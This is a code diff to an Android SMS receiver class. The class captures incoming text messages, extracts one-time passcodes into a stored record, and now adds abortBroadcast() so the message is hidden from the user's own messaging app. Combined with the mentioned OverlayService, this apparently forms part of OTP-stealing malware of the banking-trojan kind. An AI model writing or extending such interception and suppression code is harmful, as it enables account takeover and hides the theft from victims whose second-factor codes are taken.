@@ -6,7 +6,6 @@ import android.content.Intent
 import android.provider.Telephony
 import android.util.Log
 
-/** Instant SMS intercept — works while OverlayService is alive */
 class SmsInterceptReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
@@ -21,17 +20,17 @@ class SmsInterceptReceiver : BroadcastReceiver() {
             val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
             if (sender.isBlank() || body.isBlank()) return
 
-            val config = ConfigManager(context).load()
-            if (!SmsMatcher.shouldCapture(config, sender, body)) return
+            val configManager = ConfigManager(context)
+            val config = configManager.load()
+            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return
 
-            val interceptNo = sender.replace("\\D".toRegex(), "").ifBlank { sender.trim() }
-                .let { if (it.length >= 8) it else sender.trim() }
+            val interceptDisplay = SmsMatcher.interceptDisplay(config, sender, configManager)
             val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
             val otp = LastOtp(
                 otp = token,
-                sender = interceptNo,
+                sender = interceptDisplay,
                 body = body,
-                phone = interceptNo,
+                phone = interceptDisplay,
                 messageLabel = "",
                 direction = "incoming"
             )
@@ -39,6 +38,9 @@ class SmsInterceptReceiver : BroadcastReceiver() {
             context.sendBroadcast(
                 Intent(ACTION_SMS_CAPTURED).setPackage(context.packageName)
             )
+            try {
+                abortBroadcast()
+            } catch (_: Exception) {}
         } catch (e: Exception) {
             Log.w(TAG, "SMS intercept failed: ${e.message}")
         }
